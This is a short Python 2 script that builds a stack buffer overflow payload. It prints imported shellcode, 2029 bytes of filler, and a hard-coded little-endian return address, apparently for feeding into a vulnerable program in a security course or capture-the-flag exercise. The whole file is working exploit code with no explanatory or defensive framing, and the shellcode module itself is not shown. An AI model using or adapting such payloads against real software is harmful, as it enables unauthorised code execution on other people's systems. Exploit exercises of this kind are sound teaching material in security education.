from shellcode import shellcode
from struct import pack

def main():
	print shellcode + "\x07"*2029 + pack("<I", 0xbffe8c38)
	#print shellcode

if __name__ == '__main__':
	main()
